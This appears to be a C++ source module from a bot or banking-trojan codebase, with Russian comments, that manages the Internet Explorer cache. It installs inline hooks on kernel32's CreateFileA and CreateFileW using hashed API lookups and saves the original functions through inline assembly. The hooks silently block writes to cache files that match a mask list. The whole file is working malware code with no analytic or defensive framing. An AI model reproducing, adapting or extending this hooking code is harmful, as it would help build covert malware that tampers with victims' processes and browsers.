// ---------------------------------------------------------------------------

#pragma hdrstop

#include "Windows.h"

#include "IECacheUtils.h"
#include "GetApi.h"
#include "Memory.h"
#include "Splice.h"
#include "Utils.h"
#include "shlobj.h"
#include "BotClasses.h"

// ---------------------------------------------------------------------------

typedef HANDLE(WINAPI * TCreateFile)(LPBYTE lpFileName, DWORD dwDesiredAccess,
	DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);


typedef HANDLE (WINAPI *TCreateFileW)(
	LPCWSTR lpFileName,
	DWORD dwDesiredAccess,
	DWORD dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD dwCreationDisposition,
	DWORD dwFlagsAndAttributes,
    HANDLE hTemplateFile
    );
// ---------------------------------------------------------------------------

// Адреса оригинальный функций

PRequestList IERequestList = NULL;

namespace IECUtils {

	PStrings Masks;
	RTL_CRITICAL_SECTION Lock;
	PCHAR CachePath = NULL;
	PWCHAR CachePathW = NULL;
	DWORD CachePathSize = 0;
	DWORD CachePathHash = 0;
	DWORD CachePathHashW = 0;


	TCreateFile Real_CreateFileA;
	TCreateFileW Real_CreateFileW;


	// -------------------------------------------------------------------------

	bool IsCacheFile(PCHAR FileName)
	{
		// Функция возвращает истину если файл лежит
		// в директории хранения временных файлов интернета
		if (FileName == NULL || CachePathSize == 0)
			return false;

		return StrSame(FileName, CachePath, true, CachePathSize);
    }
    // -------------------------------------------------------------------------

	bool IsInvalidFile(PCHAR FileName)
	{
		if (!IsCacheFile(FileName))
			return false;

		bool Result = false;

		pEnterCriticalSection(&IECUtils::Lock);

		for (DWORD i = 0; i < Strings::Count(Masks); i++)
		{
			PCHAR Mask = Strings::GetItem(Masks, i, false);

			if (!STR::IsEmpty(Mask))
			if (WildCmp(FileName, Mask))
				{
					Result = true;
					break;
				}
		}

		pLeaveCriticalSection(&IECUtils::Lock);

		return Result;
	}

	// -------------------------------------------------------------------------

	HANDLE WINAPI Hook_CreateFileA(LPBYTE lpFileName, DWORD dwDesiredAccess,
		DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
		DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {

	
		if (dwDesiredAccess == GENERIC_WRITE)
		{
			if (IsInvalidFile((PCHAR)lpFileName))
			{
				return INVALID_HANDLE_VALUE;
			}
		}

		return Real_CreateFileA(lpFileName, dwDesiredAccess, dwShareMode,
			lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes,
			hTemplateFile);
	}

	// -------------------------------------------------------------------------

	HANDLE WINAPI Hook_CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess,
		DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
		DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
	{

		if (dwDesiredAccess == GENERIC_WRITE  && !WSTR::IsEmpty((PWCHAR)lpFileName) &&
			WSTR::GetHash((PWCHAR)lpFileName, CachePathSize, false) == 	CachePathHashW)
		{

			PCHAR FN = WSTR::ToAnsi(lpFileName, 0);

		  	if (FN != NULL)
			{
				bool Invalid = IsInvalidFile(FN);

				STR::Free(FN);
				if (Invalid)
					return INVALID_HANDLE_VALUE;
			}   
		}

		return Real_CreateFileW(lpFileName, dwDesiredAccess,
		dwShareMode, lpSecurityAttributes, dwCreationDisposition,
		dwFlagsAndAttributes, hTemplateFile);

	}

	// -------------------------------------------------------------------------
	void SetHooks() {

		#define Hash_CreateFileA 0x8F8F114
		#define Hash_CreateFileW 0x8F8F102

		if (HookApi(DLL_KERNEL32, Hash_CreateFileA, &Hook_CreateFileA)) {
			__asm mov[Real_CreateFileA], eax
		}

		 if (HookApi(DLL_KERNEL32, Hash_CreateFileW, &Hook_CreateFileW) )
		 {
		 __asm mov [Real_CreateFileW], eax
		 }

	}

}

// ---------------------------------------------------------------------------

bool IECache::Initialize(PRequestList Requests) {
	// Инициализируем методы для работы с кешем IE
	if (Requests == NULL)
		return false;

	IERequestList = Requests;

	IECUtils::Masks = Strings::Create();
	pInitializeCriticalSection(&IECUtils::Lock);

	IECUtils::SetHooks();

	IECUtils::CachePath = STR::Alloc(MAX_PATH);
    IECUtils::CachePathW = WSTR::Alloc(MAX_PATH);

	pSHGetSpecialFolderPathA(NULL, IECUtils::CachePath, CSIDL_INTERNET_CACHE, TRUE);
	pSHGetSpecialFolderPathW(NULL, IECUtils::CachePathW, CSIDL_INTERNET_CACHE, TRUE);


	IECUtils::CachePathSize = StrCalcLength(IECUtils::CachePath);
	IECUtils::CachePathHashW = WSTR::GetHash(IECUtils::CachePathW, IECUtils::CachePathSize, false);

	return true;
}

// ---------------------------------------------------------------------------
void IECache::AddMask(PCHAR Mask)
{
	// Добавляем маску игнорируемого файла

    return;

	pEnterCriticalSection(&IECUtils::Lock);

	if (Strings::IndexOf(IECUtils::Masks, Mask) < 0)
    	Strings::Add(IECUtils::Masks, Mask);

	pLeaveCriticalSection(&IECUtils::Lock);
}
